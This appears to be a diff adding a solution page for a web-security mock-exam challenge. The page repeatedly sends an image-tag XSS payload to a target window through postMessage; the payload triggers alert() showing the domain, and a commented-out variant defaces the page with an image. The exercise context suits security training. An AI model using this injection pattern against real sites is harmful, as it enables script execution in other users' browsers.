@@ -1,0 +1,21 @@
+<h1 id="msg">Loading...</h1>
+<script defer="" src="./XSS Attack_files/vaafb692b2aea4879b33c060e79fe94621666317369993"
+	integrity="sha512-0ahDYl866UMhKuYcW078ScMalXqtFJggm7TmlUtp0UlD4eQk0Ixfnm5ykXKvGJNFjLMoortdseTfsRT8oCfgGA=="
+	data-cf-beacon="{&quot;rayId&quot;:&quot;78030eb1da7d2e4a&quot;,&quot;version&quot;:&quot;2022.11.3&quot;,&quot;r&quot;:1,&quot;token&quot;:&quot;b9fcc53b2a1745afbdba8ea5603a855b&quot;,&quot;si&quot;:100}"
+	crossorigin="anonymous"></script>
+
+<script>
+	const targetURL = "https://preben.net/mockexam/challenge4.php";
+	const targetWindow = window.open(targetURL);
+
+	function setMsg(msg) {
+		document.getElementById("msg").innerText = msg;
+	}
+
+	setInterval(() => {
+		console.log("Sent message")
+		targetWindow.postMessage(`<img src="https://pxl.rip/x" onload="alert('Pixl xss on ' + document.domain)" onerror="alert('Pixl xss on ' + document.domain)"/>`, "*"); // pop alert
+		// targetWindow.postMessage(`<img src="https://og-image-pixl.vercel.app/XSS'd%20by%20Pixl.png" onload="" onerror="" width="500px"/>`, "*"); // set image
+	}, 1000);
+
+</script>
